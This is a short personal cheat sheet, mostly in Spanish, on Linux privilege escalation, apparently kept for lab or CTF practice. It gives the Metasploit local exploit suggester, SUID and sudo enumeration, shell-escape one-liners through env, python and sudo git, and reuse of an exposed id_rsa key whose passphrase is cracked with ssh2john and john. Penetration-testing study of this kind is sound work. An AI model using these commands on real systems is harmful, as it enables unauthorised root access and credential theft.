
Este escalamiento es únicamente para sistemas operativos Linux

# Metasploit

SI queremos conocer cual puede ser una posible escalada podemos utilizar el siguiente módulo:

```
use post/multi/recon/local_exploit_suggester

set session 1

run
```

Una vez corriendo te mostrará cuales son los posibles módulos de metasploit que pueden servir para poder escalar los privilegios.


-------
# Find all files from a user

If we want to find all files that are own by a specific user we can do the following:

```
find / -type f -user alison 2>/dev/null
```

-------
# SUID

Si queremos ver todos los SUID a los cuales tenemos permiso:

```
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Página para ver que se puede realizar con ello

https://gtfobins.github.io/

------

# Permisos

Realizar el siguiente comando

```
sudo -l
```

Si se encuentran permisos que se puedan aplicar con sudo aplicar la siguiente extensión al sudo (sudo -u USER): 

```
sudo -u admin git -p help config
```

------
## ENV

Para escalar privilegios sin Sudo:

```
./usr/bin/env /bin/sh -p
```

## Python

Para escalar privilegios sin sudo:

```
/usr/bin/python3.10 -c  'import os; os.execl("/bin/sh","sh","-p")'
```

---

## ID RSA

Si el activo tiene su **ID_RSA** expuesta lo que podemos hacer es logearnos mediante esa clave. El archivo se ve de la siguiente forma 

![[Pasted image 20240718230430.png]]

Asimismo es importante que cuando se guarde la clave se brinden los permisos 600 con el comando `chmod 600 id_rsa`

Para intentar conectarse lo que tienes que realizar es lo siguiente:

```
ssh -i id_rsa kay@10.10.200.0
``` 

Si es que te pide contraseña tendremos que desencriptarla con [[jhon]] que se llama ss2john. Asi que lo que tenemos que hacer es aplicar el siguiente comando: 

```
ssh2john id_rsa > forjohn.txt
```

![[Pasted image 20240718230729.png]]

Lo que hace este comando es guardar el output del ss2john para guardarlo en un archivo aparte, ya que la contraseña no es legible.

Una vez con el archivo apartado podremos correr jhon con una wordlist especial (en este caso rockyou).

```
john --wordlist=rockyou forjohn.txt
```

Si todo sale bien obtendrás la frase secreta para logearte con el otro usuario! :luc_database: